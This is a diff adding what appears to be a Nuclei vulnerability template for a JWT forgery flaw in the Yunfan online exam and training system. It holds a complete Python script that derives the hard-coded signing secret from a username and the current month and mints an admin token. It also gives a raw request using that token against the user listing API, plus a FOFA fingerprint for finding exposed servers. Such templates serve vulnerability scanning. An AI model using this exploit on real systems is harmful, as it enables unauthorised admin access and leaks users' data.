@@ -1,0 +1,19 @@
+id: poc-zoxngtutcnddwosi
+info:
+  name: 云帆在线考试培训系统存在JWT硬编码伪造
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zoxngtutcnddwosi'
+  tags: info-leak,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zoxngtutcnddwosi
+    fofa: icon_hash="-1901675253"
+http:
+- raw:
+  - "**jwt生成脚本如下：**\nimport hashlib\nimport base64\nimport json\nimport hmac\nimport calendar\nfrom datetime import datetime, timedelta\n\n# ==================== 配置 ====================\nEXPIRE_TIME = 7 * 24 * 60 * 60 * 1000  # 7天\n\ndef md5(s: str) -> str:\n    return hashlib.md5(s.encode('utf-8')).hexdigest()\n\ndef encrypt_secret(username: str) -> str:\n    now = datetime.now()\n    month = now.month - 1  # 与Java保持一致\n    sb = f\"{username}&{month}\"\n    secret = md5(sb)\n    final_secret = md5(f\"{username}&{secret}\")\n    return final_secret\n\ndef base64url_encode(data: bytes) -> str:\n    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')\n\ndef sign(username: str) -> str:\n    # 1. 构建header\n    header = {\"alg\": \"HS256\", \"typ\": \"JWT\"}\n    header_enc = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))\n\n    # 2. 构建payload\n    expire_at = int((datetime.now().timestamp() * 1000 + EXPIRE_TIME) / 1000)\n    payload = {\"username\": username, \"exp\": expire_at}\n    payload_enc = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))\n\n    # 3. 生成签名\n    secret = encrypt_secret(username)\n    signature = hmac.new(\n        key=secret.encode('utf-8'),\n        msg=f\"{header_enc}.{payload_enc}\".encode('utf-8'),\n        digestmod=hashlib.sha256\n    )\n    signature_enc = base64url_encode(signature.digest())\n\n    # 4. 拼接token\n    return f\"{header_enc}.{payload_enc}.{signature_enc}\"\n\n# ==================== 测试 ====================\nif __name__ == '__main__':\n    username = \"admin\"\n    token = sign(username)\n    print(\"生成成功！\")\n    print(\"Token：\", token)\n\n**生成的jwt值替换token：**\nPOST /exam/api/sys/user/paging HTTP/1.1\nHost: {{Hostname}}\nAccept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5\ntoken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzc2MzI4NzcxfQ.yVKtt0GDFPFhkWYjIvB8ZUIVgoYtAqLRDiisLScnUcE\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0\nAccept-Encoding: gzip, deflate\nContent-Length: 53\n\n{\"current\":1,\"size\":10,\"params\":{},\"t\":1775724298430}"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
